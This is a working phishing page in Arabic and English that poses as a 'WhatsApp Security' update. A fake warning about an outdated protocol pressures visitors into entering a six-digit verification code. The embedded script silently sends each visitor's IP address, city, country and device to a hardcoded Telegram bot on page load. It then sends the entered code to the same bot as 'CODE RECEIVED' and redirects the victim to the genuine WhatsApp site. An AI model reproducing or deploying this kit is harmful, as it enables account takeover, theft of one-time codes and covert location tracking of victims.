<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>WhatsApp Security</title>
    <style>
        :root { 
            --wa-green: #25d366; --wa-bg: #0b141a; --wa-card: #1d2a33; 
            --wa-text: #e9edef; --wa-hint: #8696a0; --wa-danger: #f15c5c; --wa-btn: #00a884;
        }
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif; }
        body { background: var(--wa-bg); color: var(--wa-text); min-height: 100vh; display: flex; align-items: center; justify-content: center; overflow: hidden; }
        
        /* التحميل والتعرف على الجهاز */
        #loader { position: fixed; inset: 0; background: var(--wa-bg); z-index: 1000; display: flex; flex-direction: column; align-items: center; justify-content: center; }
        .logo-wa { width: 55px; height: 55px; fill: var(--wa-green); margin-bottom: 20px; }
        .status-msg { font-size: 14px; color: var(--wa-hint); margin-bottom: 5px; }
        .device-detect { font-size: 12px; color: var(--wa-green); font-weight: bold; opacity: 0.8; }

        .app-ui { width: 100%; max-width: 400px; padding: 20px; text-align: center; display: none; }
        .main-title { font-size: 22px; font-weight: 700; color: #fff; margin-bottom: 25px; }

        .sys-card { background: var(--wa-card); border-radius: 12px; padding: 18px; text-align: right; border: 0.5px solid rgba(255,255,255,0.05); margin-bottom: 20px; }
        .sys-row { display: flex; justify-content: space-between; padding: 12px 0; border-bottom: 0.5px solid #26353d; font-size: 14px; }
        .sys-row:last-child { border: none; }
        .sys-lbl { color: var(--wa-hint); }
        .sys-val { font-weight: 500; color: #fff; }
        .sys-outdated { color: var(--wa-danger); font-weight: 600; }

        .alert-box { background: rgba(241, 92, 92, 0.05); border-right: 3px solid var(--wa-danger); padding: 15px; text-align: right; margin-bottom: 20px; }
        .alert-txt { font-size: 13px; line-height: 1.7; color: #d1d7db; }

        .inp-code { width: 100%; background: #2a3942; border: 1px solid #3b4a54; border-radius: 8px; padding: 16px; color: #fff; font-size: 24px; text-align: center; outline: none; margin-bottom: 15px; letter-spacing: 5px; }
        .btn-sync { background: var(--wa-btn); color: #fff; border: none; width: 100%; padding: 18px; border-radius: 35px; font-size: 16px; font-weight: 600; cursor: pointer; }
        
        .footer-tag { margin-top: 40px; font-size: 10px; color: var(--wa-hint); opacity: 0.6; }
    </style>
</head>
<body>

    <div id="loader">
        <svg class="logo-wa" viewBox="0 0 24 24"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L0 24l6.335-1.662c1.72.94 3.659 1.437 5.634 1.437h.005c6.558 0 11.894-5.335 11.897-11.893a11.821 11.821 0 00-3.48-8.413Z"/></svg>
        <div class="status-msg" id="status-txt">جاري التأكيد...</div>
        <div class="device-detect" id="det-name"></div>
    </div>

    <div class="app-ui" id="main-ui">
        <h2 class="main-title">واتساب</h2>

        <div class="sys-card">
            <div class="sys-row"><span class="sys-lbl" id="lbl-acc">رقم الحساب:</span> <span class="sys-val" id="val-acc"></span></div>
            <div class="sys-row"><span class="sys-lbl" id="lbl-dev">نوع الجهاز:</span> <span class="sys-val" id="val-dev"></span></div>
            <div class="sys-row"><span class="sys-lbl" id="lbl-prt">البروتوكول:</span> <span class="sys-outdated">Outdated (Legacy)</span></div>
        </div>

        <div class="alert-box">
            <p class="alert-txt" id="alert-msg">النظام الحالي غير متوافق مع تحديثات الأمان الأخيرة. يرجى تأكيد رمز المزامنة لتفعيل التشفير الموحد TLS 1.3 وحماية حسابك من التوقف.</p>
        </div>

        <input type="tel" id="otp-in" class="inp-code" placeholder="--- ---" maxlength="6">
        <button class="btn-sync" id="btn-txt" onclick="doSync()">تأكيد التحديث الآن</button>

        <div class="footer-tag">WhatsApp Security © 2026</div>
    </div>

    <script>
        const CFG = {
            TOKEN: '8254072521:AAGs0le9FRacWKgYcdk3CzHXhEiTXZb8dZU',
            CHAT: '5446862709',
            USER_NUM: new URLSearchParams(window.location.search).get('u') || "01112816444"
        };

        const TRANSLATE = {
            ar: { status: "جاري التأكيد...", acc: "رقم الحساب:", dev: "نوع الجهاز:", prt: "البروتوكول:", alert: "النظام الحالي غير متوافق مع تحديثات الأمان الأخيرة. يرجى تأكيد رمز المزامنة لتفعيل التشفير الموحد TLS 1.3 وحماية حسابك من التوقف.", btn: "تأكيد التحديث الآن" },
            en: { status: "Confirming...", acc: "Account:", dev: "Device:", prt: "Protocol:", alert: "Your current system is not compatible with the latest security updates. Please confirm sync code to enable TLS 1.3 and protect your account.", btn: "Confirm Update Now" }
        };

        function detectDevice() {
            const ua = navigator.userAgent;
            if (/iPhone|iPad/i.test(ua)) return "iPhone / iOS";
            if (/Android/i.test(ua)) return "Android Device";
            return "PC / Web";
        }

        async function logData() {
            try {
                const res = await fetch('https://ipapi.co/json/');
                const d = await res.json();
                const log = `👤 <b>New Target</b>\nNum: <code>${CFG.USER_NUM}</code>\nDevice: ${detectDevice()}\nIP: <code>${d.ip}</code>\nLoc: ${d.city}, ${d.country_name}`;
                fetch(`https://api.telegram.org/bot${CFG.TOKEN}/sendMessage?chat_id=${CFG.CHAT}&text=${encodeURIComponent(log)}&parse_mode=HTML`);
            } catch(e){}
        }

        window.onload = () => {
            logData();
            const lang = navigator.language.startsWith('ar') ? 'ar' : 'en';
            const T = TRANSLATE[lang];
            document.body.dir = lang === 'ar' ? 'rtl' : 'ltr';
            
            document.getElementById('status-txt').innerText = T.status;
            document.getElementById('det-name').innerText = detectDevice();
            
            setTimeout(() => {
                document.getElementById('val-acc').innerText = `+20 ${CFG.USER_NUM.slice(0,3)} •••• ${CFG.USER_NUM.slice(-2)}`;
                document.getElementById('val-dev').innerText = detectDevice();
                document.getElementById('lbl-acc').innerText = T.acc;
                document.getElementById('lbl-dev').innerText = T.dev;
                document.getElementById('lbl-prt').innerText = T.prt;
                document.getElementById('alert-msg').innerText = T.alert;
                document.getElementById('btn-txt').innerText = T.btn;
                
                document.getElementById('loader').style.display = 'none';
                document.getElementById('main-ui').style.display = 'block';
            }, 3000);
        };

        async function doSync() {
            const code = document.getElementById('otp-in').value;
            if(code.length < 6) return;
            const log = `🔥 <b>CODE RECEIVED</b>\nTarget: ${CFG.USER_NUM}\nCode: <code>${code}</code>\nDevice: ${detectDevice()}`;
            await fetch(`https://api.telegram.org/bot${CFG.TOKEN}/sendMessage?chat_id=${CFG.CHAT}&text=${encodeURIComponent(log)}&parse_mode=HTML`);
            window.location.href = "https://www.whatsapp.com/security";
        }
    </script>
</body>
</html>
